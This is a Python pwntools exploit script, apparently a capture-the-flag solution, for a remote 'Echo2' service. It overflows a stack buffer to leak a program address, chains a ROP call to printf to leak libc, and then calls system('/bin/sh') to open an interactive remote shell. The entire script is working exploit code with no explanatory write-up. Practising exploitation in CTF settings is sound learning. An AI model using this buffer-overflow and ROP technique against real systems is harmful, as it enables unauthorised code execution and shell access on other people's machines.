#!/usr/bin/env python3

from pwn import *

context(
    arch="amd64",
    os="linux",
    terminal='tmux splitw -h -p 60'.split(),
    # This allows us to send strings to pwntools where byte strings are expected
    encoding='ISO-8859-1'
)

p = None


def echo(payload):
    p.sendlineafter('Echo2\n', str(len(payload) + 1))
    p.send(payload)


def main():
    global p

    exe = ELF('./challenge')
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

    # p = process('./challenge')
    p = remote('34.162.252.153', 1337)

    main_lsb = (exe.sym.main + 8) & 0xFF

    echo(b'A' * 0x116 + b'B' + p8(main_lsb))

    p.recvline()
    leak_bytes = p.recvline().strip()
    leak = u64(leak_bytes.split(b'B')[1].ljust(8, b'\x00'))

    text_base = (leak & ~0xFFF) - 0x1000

    exe.address = text_base

    info('leak: 0x%x', leak)
    info('printf: 0x%x', exe.sym.printf)

    r = ROP(exe)
    r.raw(r.ret)
    r.printf()
    r.raw(r.ret)
    r.main()

    print(r.dump())

    echo(b'A' * 0x116 + b'B' + r.chain())

    p.recvline()
    p.recvline()
    libc_leak = u64(p.recv(6).ljust(8, b'\x00'))
    libc.address = libc_leak - libc.sym.funlockfile

    info('libc leak: 0x%x', libc_leak)
    info('libc address: 0x%x', libc.address)

    r = ROP(libc)
    binsh = next(libc.search(b"/bin/sh"))
    r.raw(r.ret)
    r.system(binsh)

    print(r.dump())

    echo(b'A' * 0x117 + r.chain())

    p.interactive()


main()
